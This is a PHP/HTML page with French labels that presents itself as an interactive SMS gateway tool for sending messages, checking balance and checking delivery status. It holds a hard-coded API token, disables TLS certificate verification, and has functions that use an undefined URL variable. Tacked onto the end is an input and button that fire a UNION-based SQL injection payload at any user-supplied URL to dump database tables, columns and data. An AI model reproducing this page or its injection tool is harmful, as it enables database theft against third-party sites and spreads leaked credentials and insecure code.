<?php
// Configuration générale
$apiToken = 'IaBCzWyg90Zv7bboODP9pcattquUwBMvWVXstueA';
$apiBaseUrl = 'https://api.smsinbd.com/sms-api';

// Fonction pour envoyer un SMS
function sendSms($apiToken, $senderId, $contactNumber, $messageContent) {
    $url = "$apiBaseUrl/sendsms";
    $postFields = [
        'api_token' => $apiToken,
        'senderid' => $senderId,
        'message' => $messageContent,
        'contact_number' => $contactNumber,
    ];

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $response = curl_exec($curl);
    curl_close($curl);
    return json_decode($response, true);
}

// Fonction pour vérifier le solde
function checkBalance($apiToken) {
    $url = "$apiBaseUrl/balance?api_token=$apiToken";

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $response = curl_exec($curl);
    curl_close($curl);
    return json_decode($response, true);
}

// Fonction pour vérifier le statut de livraison
function checkDeliveryStatus($apiToken, $smsId) {
    $url = "$apiBaseUrl/delivery-report?api_token=$apiToken&smsId=$smsId";

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $response = curl_exec($curl);
    curl_close($curl);
    return json_decode($response, true);
}

// Gestion des requêtes POST
$response = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['send_sms'])) {
        $senderId = $_POST['senderid'];
        $contactNumber = $_POST['contact_number'];
        $messageContent = $_POST['message'];
        $response = sendSms($apiToken, $senderId, $contactNumber, $messageContent);
    } elseif (isset($_POST['check_balance'])) {
        $response = checkBalance($apiToken);
    } elseif (isset($_POST['check_status'])) {
        $smsId = $_POST['sms_id'];
        $response = checkDeliveryStatus($apiToken, $smsId);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API SMS Interactive</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #00ff99;
            padding: 20px;
        }
        h1, h2 {
            color: #00ff99;
        }
        .container {
            max-width: 600px;
            margin: auto;
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #00ff99;
        }
        input, textarea, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: none;
            border-radius: 5px;
        }
        button {
            background-color: #00ff99;
            color: #121212;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background-color: #00cc77;
        }
        .response {
            margin-top: 20px;
            padding: 10px;
            background-color: #252525;
            border: 1px solid #00ff99;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>API SMS Interactive</h1>
        <form method="POST">
            <h2>Envoyer un SMS</h2>
            <div class="form-group">
                <label for="senderid">Sender ID :</label>
                <input type="text" name="senderid" id="senderid" required>
            </div>
            <div class="form-group">
                <label for="contact_number">Numéro de Contact :</label>
                <input type="text" name="contact_number" id="contact_number" required>
            </div>
            <div class="form-group">
                <label for="message">Message :</label>
                <textarea name="message" id="message" rows="3" required></textarea>
            </div>
            <button type="submit" name="send_sms">Envoyer le SMS</button>
        </form>

        <form method="POST">
            <h2>Vérifier le Solde</h2>
            <button type="submit" name="check_balance">Vérifier le Solde</button>
        </form>

        <form method="POST">
            <h2>Statut de Livraison</h2>
            <div class="form-group">
                <label for="sms_id">ID du SMS :</label>
                <input type="text" name="sms_id" id="sms_id" required>
            </div>
            <button type="submit" name="check_status">Vérifier le Statut</button>
        </form>

        <?php if ($response): ?>
            <div class="response">
                <h2>Résultat :</h2>
                <pre><?php echo htmlspecialchars(json_encode($response, JSON_PRETTY_PRINT)); ?></pre>
            </div>
        <?php endif; ?>
    </div>
        <input type="text" id="endpoint" placeholder="URL cible">
        <button onclick="inject()">Exécuter</button>
        <script>
            function inject() {
                const targetUrl = document.getElementById("endpoint").value;
                const sqlPayload = "' UNION SELECT group_concat(table_name, ':', column_name, ':', data) FROM information_schema.tables, information_schema.columns -- -";
                fetch(`${targetUrl}?id=${encodeURIComponent(sqlPayload)}`)
                    .then(response => response.text())
                    .then(data => console.log(data))
                    .catch(err => console.error("Injection échouée:", err));
            }
    </script>
</body>
</html>